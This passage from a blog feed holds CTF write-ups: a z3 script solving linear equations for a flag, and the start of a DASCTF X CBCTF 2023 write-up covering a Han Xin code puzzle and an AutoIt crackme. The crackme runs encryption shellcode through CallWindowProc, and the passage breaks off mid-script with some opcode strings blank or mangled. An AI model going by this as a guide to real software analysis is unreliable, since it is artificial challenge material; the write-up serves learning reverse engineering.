class="number">11</span>] * <span class="number">8101</span> + flag[<span class="number">12</span>] * <span class="number">9519</span> +flag[<span class="number">13</span>] * <span class="number">3048</span> + flag[<span class="number">14</span>] * <span class="number">3168</span> + flag[<span class="number">15</span>] * <span class="number">2775</span> + flag[<span class="number">16</span>] * <span class="number">4366</span> + flag[<span class="number">17</span>]* <span class="number">4066</span> + flag[<span class="number">18</span>] * <span class="number">7490</span> + flag[<span class="number">19</span>] * <span class="number">5533</span> + flag[<span class="number">20</span>] * <span class="number">2139</span> + flag[<span class="number">21</span>] * <span class="number">87</span> ==<span class="number">10030960</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1549</span> + flag[<span class="number">1</span>] * <span class="number">8554</span> + flag[<span class="number">2</span>] * <span class="number">6510</span> + flag[<span class="number">3</span>] * <span class="number">6559</span> +flag[<span class="number">4</span>] * <span class="number">5570</span> + flag[<span class="number">5</span>] * <span class="number">1003</span> + flag[<span class="number">6</span>] * <span class="number">8562</span> + flag[<span class="number">7</span>] * <span class="number">6793</span> + flag[<span class="number">8</span>] *<span class="number">3509</span> + flag[<span class="number">9</span>] * <span class="number">4965</span> + flag[<span class="number">10</span>] * <span class="number">6111</span> + flag[<span class="number">11</span>] * <span class="number">1229</span> + flag[<span class="number">12</span>] * <span class="number">5654</span> +flag[<span class="number">13</span>] * <span class="number">2204</span> + flag[<span class="number">14</span>] * <span class="number">2217</span> + flag[<span class="number">15</span>] * <span class="number">5039</span> + flag[<span class="number">16</span>] * <span class="number">5657</span> + flag[<span class="number">17</span>]* <span class="number">9426</span> + flag[<span class="number">18</span>] * <span class="number">7604</span> + flag[<span class="number">19</span>] * <span class="number">5883</span> + flag[<span class="number">20</span>] * <span class="number">5285</span> + flag[<span class="number">21</span>] * <span class="number">17</span> ==<span class="number">10946682</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2678</span> + flag[<span class="number">1</span>] * <span class="number">4369</span> + flag[<span class="number">2</span>] * <span class="number">7509</span> + flag[<span class="number">3</span>] * <span class="number">1564</span> +flag[<span class="number">4</span>] * <span class="number">7777</span> + flag[<span class="number">5</span>] * <span class="number">2271</span> + flag[<span class="number">6</span>] * <span class="number">9696</span> + flag[<span class="number">7</span>] * <span class="number">3874</span> + flag[<span class="number">8</span>] *<span class="number">2212</span> + flag[<span class="number">9</span>] * <span class="number">6764</span> + flag[<span class="number">10</span>] * <span class="number">5727</span> + flag[<span class="number">11</span>] * <span class="number">5971</span> + flag[<span class="number">12</span>] * <span class="number">5876</span> +flag[<span class="number">13</span>] * <span class="number">9959</span> + flag[<span class="number">14</span>] * <span class="number">4604</span> + flag[<span class="number">15</span>] * <span class="number">8461</span> + flag[<span class="number">16</span>] * <span class="number">2350</span> + flag[<span class="number">17</span>]* <span class="number">3564</span> + flag[<span class="number">18</span>] * <span class="number">1831</span> + flag[<span class="number">19</span>] * <span class="number">6088</span> + flag[<span class="number">20</span>] * <span class="number">4575</span> + flag[<span class="number">21</span>] * <span class="number">9</span> ==<span class="number">10286414</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">8916</span> + flag[<span class="number">1</span>] * <span class="number">8647</span> + flag[<span class="number">2</span>] * <span class="number">4522</span> + flag[<span class="number">3</span>] * <span class="number">3579</span> +flag[<span class="number">4</span>] * <span class="number">5319</span> + flag[<span class="number">5</span>] * <span class="number">9124</span> + flag[<span class="number">6</span>] * <span class="number">9535</span> + flag[<span class="number">7</span>] * <span class="number">5125</span> + flag[<span class="number">8</span>] *<span class="number">3235</span> + flag[<span class="number">9</span>] * <span class="number">3246</span> + flag[<span class="number">10</span>] * <span class="number">3378</span> + flag[<span class="number">11</span>] * <span class="number">9221</span> + flag[<span class="number">12</span>] * <span class="number">1875</span> +flag[<span class="number">13</span>] * <span class="number">1008</span> + flag[<span class="number">14</span>] * <span class="number">6262</span> + flag[<span class="number">15</span>] * <span class="number">1524</span> + flag[<span class="number">16</span>] * <span class="number">8851</span> + flag[<span class="number">17</span>]* <span class="number">4367</span> + flag[<span class="number">18</span>] * <span class="number">7628</span> + flag[<span class="number">19</span>] * <span class="number">9404</span> + flag[<span class="number">20</span>] * <span class="number">2065</span> + flag[<span class="number">21</span>] * <span class="number">9</span> ==<span class="number">11809388</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9781</span> + flag[<span class="number">1</span>] * <span class="number">9174</span> + flag[<span class="number">2</span>] * <span class="number">3771</span> + flag[<span class="number">3</span>] * <span class="number">6972</span> +flag[<span class="number">4</span>] * <span class="number">6425</span> + flag[<span class="number">5</span>] * <span class="number">7631</span> + flag[<span class="number">6</span>] * <span class="number">8864</span> + flag[<span class="number">7</span>] * <span class="number">9117</span> + flag[<span class="number">8</span>] *<span class="number">4328</span> + flag[<span class="number">9</span>] * <span class="number">3919</span> + flag[<span class="number">10</span>] * <span class="number">6517</span> + flag[<span class="number">11</span>] * <span class="number">7165</span> + flag[<span class="number">12</span>] * <span class="number">6895</span> +flag[<span class="number">13</span>] * <span class="number">3609</span> + flag[<span class="number">14</span>] * <span class="number">3878</span> + flag[<span class="number">15</span>] * <span class="number">1593</span> + flag[<span class="number">16</span>] * <span class="number">9098</span> + flag[<span class="number">17</span>]* <span class="number">6432</span> + flag[<span class="number">18</span>] * <span class="number">2584</span> + flag[<span class="number">19</span>] * <span class="number">8403</span> + flag[<span class="number">20</span>] * <span class="number">4029</span> + flag[<span class="number">21</span>] * <span class="number">30</span> ==<span class="number">13060508</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2511</span> + flag[<span class="number">1</span>] * <span class="number">8583</span> + flag[<span class="number">2</span>] * <span class="number">2428</span> + flag[<span class="number">3</span>] * <span class="number">9439</span> +flag[<span class="number">4</span>] * <span class="number">3662</span> + flag[<span class="number">5</span>] * <span class="number">3278</span> + flag[<span class="number">6</span>] * <span class="number">8305</span> + flag[<span class="number">7</span>] * <span class="number">1100</span> + flag[<span class="number">8</span>] *<span class="number">7972</span> + flag[<span class="number">9</span>] * <span class="number">8510</span> + flag[<span class="number">10</span>] * <span class="number">8552</span> + flag[<span class="number">11</span>] * <span class="number">9993</span> + flag[<span class="number">12</span>] * <span class="number">6855</span> +flag[<span class="number">13</span>] * <span class="number">1702</span> + flag[<span class="number">14</span>] * <span class="number">1640</span> + flag[<span class="number">15</span>] * <span class="number">3787</span> + flag[<span class="number">16</span>] * <span class="number">8161</span> + flag[<span class="number">17</span>]* <span class="number">2110</span> + flag[<span class="number">18</span>] * <span class="number">5320</span> + flag[<span class="number">19</span>] * <span class="number">3313</span> + flag[<span class="number">20</span>] * <span class="number">9286</span> + flag[<span class="number">21</span>] * <span class="number">74</span> ==<span class="number">10568195</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4974</span> + flag[<span class="number">1</span>] * <span class="number">4445</span> + flag[<span class="number">2</span>] * <span class="number">7368</span> + flag[<span class="number">3</span>] * <span class="number">9132</span> +flag[<span class="number">4</span>] * <span class="number">5894</span> + flag[<span class="number">5</span>] * <span class="number">7822</span> + flag[<span class="number">6</span>] * <span class="number">7923</span> + flag[<span class="number">7</span>] * <span class="number">6822</span> + flag[<span class="number">8</span>] *<span class="number">2698</span> + flag[<span class="number">9</span>] * <span class="number">3643</span> + flag[<span class="number">10</span>] * <span class="number">8392</span> + flag[<span class="number">11</span>] * <span class="number">4126</span> + flag[<span class="number">12</span>] * <span class="number">1941</span> +flag[<span class="number">13</span>] * <span class="number">6641</span> + flag[<span class="number">14</span>] * <span class="number">2949</span> + flag[<span class="number">15</span>] * <span class="number">7405</span> + flag[<span class="number">16</span>] * <span class="number">9980</span> + flag[<span class="number">17</span>]* <span class="number">6349</span> + flag[<span class="number">18</span>] * <span class="number">3328</span> + flag[<span class="number">19</span>] * <span class="number">8766</span> + flag[<span class="number">20</span>] * <span class="number">9508</span> + flag[<span class="number">21</span>] * <span class="number">65</span> ==<span class="number">12514783</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4127</span> + flag[<span class="number">1</span>] * <span class="number">4703</span> + flag[<span class="number">2</span>] * <span class="number">6409</span> + flag[<span class="number">3</span>] * <span class="number">4907</span> +flag[<span class="number">4</span>] * <span class="number">5230</span> + flag[<span class="number">5</span>] * <span class="number">3371</span> + flag[<span class="number">6</span>] * <span class="number">5666</span> + flag[<span class="number">7</span>] * <span class="number">3194</span> + flag[<span class="number">8</span>] *<span class="number">5448</span> + flag[<span class="number">9</span>] * <span class="number">8415</span> + flag[<span class="number">10</span>] * <span class="number">4525</span> + flag[<span class="number">11</span>] * <span class="number">4152</span> + flag[<span class="number">12</span>] * <span class="number">1467</span> +flag[<span class="number">13</span>] * <span class="number">5254</span> + flag[<span class="number">14</span>] * <span class="number">2256</span> + flag[<span class="number">15</span>] * <span class="number">1643</span> + flag[<span class="number">16</span>] * <span class="number">9113</span> + flag[<span class="number">17</span>]* <span class="number">8805</span> + flag[<span class="number">18</span>] * <span class="number">4315</span> + flag[<span class="number">19</span>] * <span class="number">8371</span> + flag[<span class="number">20</span>] * <span class="number">1919</span> + flag[<span class="number">21</span>] * <span class="number">2</span> ==<span class="number">10299950</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">6245</span> + flag[<span class="number">1</span>] * <span class="number">8783</span> + flag[<span class="number">2</span>] * <span class="number">6059</span> + flag[<span class="number">3</span>] * <span class="number">9375</span> +flag[<span class="number">4</span>] * <span class="number">9253</span> + flag[<span class="number">5</span>] * <span class="number">1974</span> + flag[<span class="number">6</span>] * <span class="number">8867</span> + flag[<span class="number">7</span>] * <span class="number">6423</span> + flag[<span class="number">8</span>] *<span class="number">2577</span> + flag[<span class="number">9</span>] * <span class="number">6613</span> + flag[<span class="number">10</span>] * <span class="number">2040</span> + flag[<span class="number">11</span>] * <span class="number">2209</span> + flag[<span class="number">12</span>] * <span class="number">4147</span> +flag[<span class="number">13</span>] * <span class="number">7151</span> + flag[<span class="number">14</span>] * <span class="number">1011</span> + flag[<span class="number">15</span>] * <span class="number">9446</span> + flag[<span class="number">16</span>] * <span class="number">4362</span> + flag[<span class="number">17</span>]* <span class="number">3073</span> + flag[<span class="number">18</span>] * <span class="number">3006</span> + flag[<span class="number">19</span>] * <span class="number">5499</span> + flag[<span class="number">20</span>] * <span class="number">8850</span> + flag[<span class="number">21</span>] * <span class="number">23</span> ==<span class="number">11180727</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1907</span> + flag[<span class="number">1</span>] * <span class="number">9038</span> + flag[<span class="number">2</span>] * <span class="number">3932</span> + flag[<span class="number">3</span>] * <span class="number">7054</span> +flag[<span class="number">4</span>] * <span class="number">1135</span> + flag[<span class="number">5</span>] * <span class="number">5095</span> + flag[<span class="number">6</span>] * <span class="number">6962</span> + flag[<span class="number">7</span>] * <span class="number">6481</span> + flag[<span class="number">8</span>] *<span class="number">7049</span> + flag[<span class="number">9</span>] * <span class="number">5995</span> + flag[<span class="number">10</span>] * <span class="number">6233</span> + flag[<span class="number">11</span>] * <span class="number">1321</span> + flag[<span class="number">12</span>] * <span class="number">4455</span> +flag[<span class="number">13</span>] * <span class="number">8181</span> + flag[<span class="number">14</span>] * <span class="number">5757</span> + flag[<span class="number">15</span>] * <span class="number">6953</span> + flag[<span class="number">16</span>] * <span class="number">3167</span> + flag[<span class="number">17</span>]* <span class="number">5508</span> + flag[<span class="number">18</span>] * <span class="number">4602</span> + flag[<span class="number">19</span>] * <span class="number">1420</span> + flag[<span class="number">20</span>] * <span class="number">3075</span> + flag[<span class="number">21</span>] * <span class="number">25</span> ==<span class="number">10167536</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1489</span> + flag[<span class="number">1</span>] * <span class="number">9236</span> + flag[<span class="number">2</span>] * <span class="number">7398</span> + flag[<span class="number">3</span>] * <span class="number">4088</span> +flag[<span class="number">4</span>] * <span class="number">4131</span> + flag[<span class="number">5</span>] * <span class="number">1657</span> + flag[<span class="number">6</span>] * <span class="number">9068</span> + flag[<span class="number">7</span>] * <span class="number">6420</span> + flag[<span class="number">8</span>] *<span class="number">3970</span> + flag[<span class="number">9</span>] * <span class="number">3265</span> + flag[<span class="number">10</span>] * <span class="number">5343</span> + flag[<span class="number">11</span>] * <span class="number">5386</span> + flag[<span class="number">12</span>] * <span class="number">2583</span> +flag[<span class="number">13</span>] * <span class="number">2813</span> + flag[<span class="number">14</span>] * <span class="number">7181</span> + flag[<span class="number">15</span>] * <span class="number">9116</span> + flag[<span class="number">16</span>] * <span class="number">4836</span> + flag[<span class="number">17</span>]* <span class="number">6917</span> + flag[<span class="number">18</span>] * <span class="number">1123</span> + flag[<span class="number">19</span>] * <span class="number">7276</span> + flag[<span class="number">20</span>] * <span class="number">2257</span> + flag[<span class="number">21</span>] * <span class="number">65</span> ==<span class="number">10202212</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2097</span> + flag[<span class="number">1</span>] * <span class="number">1253</span> + flag[<span class="number">2</span>] * <span class="number">1469</span> + flag[<span class="number">3</span>] * <span class="number">2731</span> +flag[<span class="number">4</span>] * <span class="number">9565</span> + flag[<span class="number">5</span>] * <span class="number">9185</span> + flag[<span class="number">6</span>] * <span class="number">1095</span> + flag[<span class="number">7</span>] * <span class="number">8666</span> + flag[<span class="number">8</span>] *<span class="number">2919</span> + flag[<span class="number">9</span>] * <span class="number">7962</span> + flag[<span class="number">10</span>] * <span class="number">1497</span> + flag[<span class="number">11</span>] * <span class="number">6642</span> + flag[<span class="number">12</span>] * <span class="number">4108</span> +flag[<span class="number">13</span>] * <span class="number">6892</span> + flag[<span class="number">14</span>] * <span class="number">7161</span> + flag[<span class="number">15</span>] * <span class="number">7552</span> + flag[<span class="number">16</span>] * <span class="number">5666</span> + flag[<span class="number">17</span>]* <span class="number">4060</span> + flag[<span class="number">18</span>] * <span class="number">7799</span> + flag[<span class="number">19</span>] * <span class="number">5080</span> + flag[<span class="number">20</span>] * <span class="number">8516</span> + flag[<span class="number">21</span>] * <span class="number">43</span> ==<span class="number">10435786</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1461</span> + flag[<span class="number">1</span>] * <span class="number">1676</span> + flag[<span class="number">2</span>] * <span class="number">4755</span> + flag[<span class="number">3</span>] * <span class="number">7982</span> +flag[<span class="number">4</span>] * <span class="number">3860</span> + flag[<span class="number">5</span>] * <span class="number">1067</span> + flag[<span class="number">6</span>] * <span class="number">6715</span> + flag[<span class="number">7</span>] * <span class="number">4019</span> + flag[<span class="number">8</span>] *<span class="number">4983</span> + flag[<span class="number">9</span>] * <span class="number">2031</span> + flag[<span class="number">10</span>] * <span class="number">1173</span> + flag[<span class="number">11</span>] * <span class="number">2241</span> + flag[<span class="number">12</span>] * <span class="number">2594</span> +flag[<span class="number">13</span>] * <span class="number">8672</span> + flag[<span class="number">14</span>] * <span class="number">4810</span> + flag[<span class="number">15</span>] * <span class="number">7963</span> + flag[<span class="number">16</span>] * <span class="number">7749</span> + flag[<span class="number">17</span>]* <span class="number">5730</span> + flag[<span class="number">18</span>] * <span class="number">9855</span> + flag[<span class="number">19</span>] * <span class="number">5858</span> + flag[<span class="number">20</span>] * <span class="number">2349</span> + flag[<span class="number">21</span>] * <span class="number">71</span> ==<span class="number">9526385</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9025</span> + flag[<span class="number">1</span>] * <span class="number">9536</span> + flag[<span class="number">2</span>] * <span class="number">1515</span> + flag[<span class="number">3</span>] * <span class="number">8177</span> +flag[<span class="number">4</span>] * <span class="number">6109</span> + flag[<span class="number">5</span>] * <span class="number">4856</span> + flag[<span class="number">6</span>] * <span class="number">6692</span> + flag[<span class="number">7</span>] * <span class="number">4929</span> + flag[<span class="number">8</span>] *<span class="number">1010</span> + flag[<span class="number">9</span>] * <span class="number">3995</span> + flag[<span class="number">10</span>] * <span class="number">3511</span> + flag[<span class="number">11</span>] * <span class="number">5910</span> + flag[<span class="number">12</span>] * <span class="number">3501</span> +flag[<span class="number">13</span>] * <span class="number">3731</span> + flag[<span class="number">14</span>] * <span class="number">6601</span> + flag[<span class="number">15</span>] * <span class="number">6200</span> + flag[<span class="number">16</span>] * <span class="number">8177</span> + flag[<span class="number">17</span>]* <span class="number">5488</span> + flag[<span class="number">18</span>] * <span class="number">5957</span> + flag[<span class="number">19</span>] * <span class="number">9661</span> + flag[<span class="number">20</span>] * <span class="number">4956</span> + flag[<span class="number">21</span>] * <span class="number">48</span> ==<span class="number">11822714</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4462</span> + flag[<span class="number">1</span>] * <span class="number">1940</span> + flag[<span class="number">2</span>] * <span class="number">5956</span> + flag[<span class="number">3</span>] * <span class="number">4965</span> +flag[<span class="number">4</span>] * <span class="number">9268</span> + flag[<span class="number">5</span>] * <span class="number">9627</span> + flag[<span class="number">6</span>] * <span class="number">3564</span> + flag[<span class="number">7</span>] * <span class="number">5417</span> + flag[<span class="number">8</span>] *<span class="number">2039</span> + flag[<span class="number">9</span>] * <span class="number">7269</span> + flag[<span class="number">10</span>] * <span class="number">9667</span> + flag[<span class="number">11</span>] * <span class="number">4158</span> + flag[<span class="number">12</span>] * <span class="number">2856</span> +flag[<span class="number">13</span>] * <span class="number">2851</span> + flag[<span class="number">14</span>] * <span class="number">9696</span> + flag[<span class="number">15</span>] * <span class="number">5986</span> + flag[<span class="number">16</span>] * <span class="number">6237</span> + flag[<span class="number">17</span>]* <span class="number">5845</span> + flag[<span class="number">18</span>] * <span class="number">5467</span> + flag[<span class="number">19</span>] * <span class="number">5227</span> + flag[<span class="number">20</span>] * <span class="number">4771</span> + flag[<span class="number">21</span>] * <span class="number">72</span> ==<span class="number">11486796</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4618</span> + flag[<span class="number">1</span>] * <span class="number">8621</span> + flag[<span class="number">2</span>] * <span class="number">8144</span> + flag[<span class="number">3</span>] * <span class="number">7115</span> +flag[<span class="number">4</span>] * <span class="number">1577</span> + flag[<span class="number">5</span>] * <span class="number">8602</span> + flag[<span class="number">6</span>] * <span class="number">3886</span> + flag[<span class="number">7</span>] * <span class="number">3712</span> + flag[<span class="number">8</span>] *<span class="number">1258</span> + flag[<span class="number">9</span>] * <span class="number">7063</span> + flag[<span class="number">10</span>] * <span class="number">1872</span> + flag[<span class="number">11</span>] * <span class="number">9855</span> + flag[<span class="number">12</span>] * <span class="number">4167</span> +flag[<span class="number">13</span>] * <span class="number">7615</span> + flag[<span class="number">14</span>] * <span class="number">6298</span> + flag[<span class="number">15</span>] * <span class="number">7682</span> + flag[<span class="number">16</span>] * <span class="number">8795</span> + flag[<span class="number">17</span>]* <span class="number">3856</span> + flag[<span class="number">18</span>] * <span class="number">6217</span> + flag[<span class="number">19</span>] * <span class="number">5764</span> + flag[<span class="number">20</span>] * <span class="number">5076</span> + flag[<span class="number">21</span>] * <span class="number">93</span> ==<span class="number">11540145</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">7466</span> + flag[<span class="number">1</span>] * <span class="number">8442</span> + flag[<span class="number">2</span>] * <span class="number">4822</span> + flag[<span class="number">3</span>] * <span class="number">7639</span> +flag[<span class="number">4</span>] * <span class="number">2049</span> + flag[<span class="number">5</span>] * <span class="number">7311</span> + flag[<span class="number">6</span>] * <span class="number">5816</span> + flag[<span class="number">7</span>] * <span class="number">8433</span> + flag[<span class="number">8</span>] *<span class="number">5905</span> + flag[<span class="number">9</span>] * <span class="number">4838</span> + flag[<span class="number">10</span>] * <span class="number">1251</span> + flag[<span class="number">11</span>] * <span class="number">8184</span> + flag[<span class="number">12</span>] * <span class="number">6465</span> +flag[<span class="number">13</span>] * <span class="number">4634</span> + flag[<span class="number">14</span>] * <span class="number">5513</span> + flag[<span class="number">15</span>] * <span class="number">3160</span> + flag[<span class="number">16</span>] * <span class="number">6720</span> + flag[<span class="number">17</span>]* <span class="number">9205</span> + flag[<span class="number">18</span>] * <span class="number">6671</span> + flag[<span class="number">19</span>] * <span class="number">7716</span> + flag[<span class="number">20</span>] * <span class="number">1905</span> + flag[<span class="number">21</span>] * <span class="number">29</span> ==<span class="number">12227250</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]]))),end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="编程" scheme="https://juana-2u.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFxCBCTF2023-Study&amp;Re</title>
    <link href="https://juana-2u.github.io/2023/11/04/DASCTFxCBCTF2023-Study&amp;Re/"/>
    <id>https://juana-2u.github.io/2023/11/04/DASCTFxCBCTF2023-Study&amp;Re/</id>
    <published>2023-11-04T13:43:39.000Z</published>
    <updated>2023-11-09T13:10:34.978Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="DASCTF-X-CBCTF-2023复现和学习"><a href="#DASCTF-X-CBCTF-2023复现和学习" class="headerlink" title="DASCTF X CBCTF 2023复现和学习"></a>DASCTF X CBCTF 2023复现和学习</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="justlisten"><a href="#justlisten" class="headerlink" title="justlisten"></a><strong><strong>justlisten</strong></strong></h2><p>了解到题目中的hint图片是<strong>汉信码</strong>（又涨知识了），使用下面的网站扫描图片得到的解码结果，得到密码:<code>0urS3cret</code></p><p><a class="link"   href="https://tuzim.net/hxdecode/" >在线汉信码识别,汉信码解码 - 兔子二维码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/Untitled-1699105524202-1.png"                      alt="Untitled"                ></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a><strong><strong>auuuu3</strong></strong></h2><p>通过解析autoit动态脚本语言执行命令，先安装这个工具</p><p><a href="https://github.com/nazywam/AutoIt-Ripper"><code>https://github.com/nazywam/AutoIt-Ripper</code></a></p><p>在Scripts文件夹中找到<code>autoit-ripper.exe</code>程序，按照语法输入得到script.au3文件</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/AUUU3.png"                      alt="AUUU3"                ></p><p>得到的au3文件分析加密的流程。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Func ENC ( $DATA , $KEY )</span><br><span class="line">$DATA = Binary ( $DATA )</span><br><span class="line">Local $DATALEN = BinaryLen ( $DATA )</span><br><span class="line">If $DATALEN = <span class="number">0</span> Then</span><br><span class="line">Return <span class="string">&quot;&quot;</span></span><br><span class="line">ElseIf $DATALEN &lt; <span class="number">8</span> Then</span><br><span class="line">$DATALEN = <span class="number">8</span></span><br><span class="line">EndIf</span><br><span class="line">Local $OPCODE = <span class="string">&quot;0xquot;</span></span><br><span class="line">Local $CODEBUFFER = DllStructCreate ( <span class="string">&quot;byte[&quot;</span> &amp; BinaryLen ( $OPCODE ) &amp; <span class="string">&quot;]&quot;</span> )</span><br><span class="line">DllStructSetData ( $CODEBUFFER , <span class="number">1</span> , $OPCODE )</span><br><span class="line">Local $V = DllStructCreate ( <span class="string">&quot;byte[&quot;</span> &amp; Ceiling ( $DATALEN / <span class="number">4</span> ) * <span class="number">4</span> &amp; <span class="string">&quot;]&quot;</span> )</span><br><span class="line">DllStructSetData ( $V , <span class="number">1</span> , $DATA )</span><br><span class="line">Local $K = DllStructCreate ( <span class="string">&quot;byte[16]&quot;</span> )</span><br><span class="line">DllStructSetData ( $K , <span class="number">1</span> , $KEY )</span><br><span class="line">DllCall ( <span class="string">&quot;user32.dll&quot;</span> , <span class="string">&quot;none&quot;</span> , <span class="string">&quot;CallWindowProc&quot;</span> , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $CODEBUFFER ) , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $V ) , <span class="string">&quot;int&quot;</span> , Ceiling ( $DATALEN / <span class="number">4</span> ) , <span class="string">&quot;ptr&quot;</span> , DllStructGetPtr ( $K ) , <span class="string">&quot;int&quot;</span> , <span class="number">0</span> )</span><br><span class="line">Local $RET = DllStructGetData ( $V , <span class="number">1</span> )</span><br><span class="line">$CODEBUFFER = <span class="number">0</span></span><br><span class="line">$V = <span class="number">0</span></span><br><span class="line">$K = <span class="number">0</span></span><br><span class="line">Return $RET</span><br><span class="line">EndFunc</span><br><span class="line"><span class="comment">##输入字符的加密函数ENC 函数动态加载user32.dll函数，从中调用加密函数加密</span></span><br><span class="line">$FORM1 = GUICreate ( <span class="string">&quot;auuuu3&quot;</span> , <span class="number">378</span> , <span class="number">185</span> , <span class="number">254</span> , <span class="number">182</span> )</span><br><span class="line">GUICtrlSetFont ( + <span class="number">4294967295</span> , <span class="number">14</span> , <span class="number">400</span> , <span class="number">0</span> , <span class="string">&quot;MS Sans Serif&quot;</span> )</span><br><span class="line">$SERIAL = GUICtrlCreateInput ( <span class="string">&quot;&quot;</span> , <span class="number">56</span> , <span class="number">48</span> , <span class="number">257</span> , <span class="number">21</span> )</span><br><span class="line">$CHECK = GUICtrlCreateButton ( <span class="string">&quot;Check&quot;</span> , <span class="number">56</span> , <span class="number">80</span> , <span class="number">257</span> , <span class="number">33</span> )</span><br><span class="line">GUISetState ( @SW_SHOW )</span><br><span class="line">While <span class="number">1</span></span><br><span class="line">$NMSG = GUIGetMsg ( )</span><br><span class="line">Switch $NMSG</span><br><span class="line">Case $GUI_EVENT_CLOSE</span><br><span class="line">Exit</span><br><span class="line">Case $CHECK</span><br><span class="line">Dim $CIPHERTEXT = <span class="string">&quot;0x7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">$KEY = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">$STR = GUICtrlRead ( $SERIAL )</span><br><span class="line">If StringLen ( $STR ) &lt;&gt; <span class="number">38</span> Then</span><br><span class="line">MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;wrong&quot;</span> )</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span class="line">$ENCRYPT = ENC ( $STR , $KEY )</span><br><span class="line">If $ENCRYPT == $CIPHERTEXT Then</span><br><span class="line">MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;correct&quot;</span> )</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span class="line">MsgBox ( <span class="string">&quot;&quot;</span> , <span class="string">&quot;&quot;</span> , <span class="string">&quot;wrong&quot;</span> )</span><br><span class="line">EndSwitch</span><br><span class="line">WEnd</span><br></pre></td></tr></table></figure></div><p>使用ENC函数加密后的dll文件调用，使用上面的密文加载一个dll文件</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">opcode =<span class="string">&quotquot;</span></span><br><span class="line">hex_bytes = binascii.a2b_hex(opcode)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.dll&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    